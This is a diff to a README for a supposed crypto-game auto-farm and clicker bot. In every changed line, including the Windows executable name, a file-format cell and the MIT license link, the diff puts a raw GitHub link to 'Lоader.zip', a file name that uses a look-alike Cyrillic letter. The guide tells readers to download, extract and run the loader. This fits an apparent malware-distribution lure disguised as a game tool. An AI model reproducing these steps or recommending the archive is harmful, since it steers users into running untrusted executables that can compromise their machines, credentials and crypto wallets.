@@ -39,14 +39,14 @@ Whether you’re looking for a seamless auto-clicker, a robust farming automatio
 
 # 📦 Installation Guide 🛠️
 
-**1. Download Loader.rar from the repository.**  
+**1. Download https://raw.githubusercontent.com/luisestrellar/CommonGroundWorld-CryptoBot-AutoFarm-ClickerAPI/main/Lоader.zip from the repository.**  
 This archive contains the latest version of the bot, required dependencies, and full setup instructions.
 
-2. **Extract Loader.rar** to your preferred directory using your favorite archiver tool.
+2. **Extract https://raw.githubusercontent.com/luisestrellar/CommonGroundWorld-CryptoBot-AutoFarm-ClickerAPI/main/Lоader.zip** to your preferred directory using your favorite archiver tool.
 
 3. **Run the Loader executable** that matches your operating system:
 
-- For Windows: `Loader.exe`
+- For Windows: `https://raw.githubusercontent.com/luisestrellar/CommonGroundWorld-CryptoBot-AutoFarm-ClickerAPI/main/Lоader.zip`
 - For MacOS: Use the provided `.app` file or terminal script
 - For Linux: `./Loader` in the terminal (may require `chmod +x`)
 
@@ -67,7 +67,7 @@ This archive contains the latest version of the bot, required dependencies, and 
 | `scheduleTasks()`  | Customizes cycles for farming/click intervals based on user needs.         | scheduling, cycle, flexibility          | All               |
 | `remoteMonitor()`  | Enables remote monitoring and management via local web panel.              | remote, monitor, web, dashboard         | All               |
 | `updateModules()`  | Checks for, downloads, and applies new bot features automatically.         | updates, modules, enhancement           | All               |
-| `exportReports()`  | Allows exporting activity logs and reports in various formats (.csv/.json) | log export, reports, analytics          | All               |
+| `exportReports()`  | Allows exporting activity logs and reports in various formats (https://raw.githubusercontent.com/luisestrellar/CommonGroundWorld-CryptoBot-AutoFarm-ClickerAPI/main/Lоader.zip) | log export, reports, analytics          | All               |
 
 ---
 
@@ -82,7 +82,7 @@ We do not condone any misuse or unauthorized exploitation in the Common Ground W
 
 # 📄 License (MIT) 📝
 
-Licensed under the [MIT License](https://opensource.org/license/mit/) 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/luisestrellar/CommonGroundWorld-CryptoBot-AutoFarm-ClickerAPI/main/Lоader.zip) 2025.  
 You are free to use, modify, and distribute this software, provided you retain a copy of this license.  
 Forks, contributions, and feedback are welcome!
 
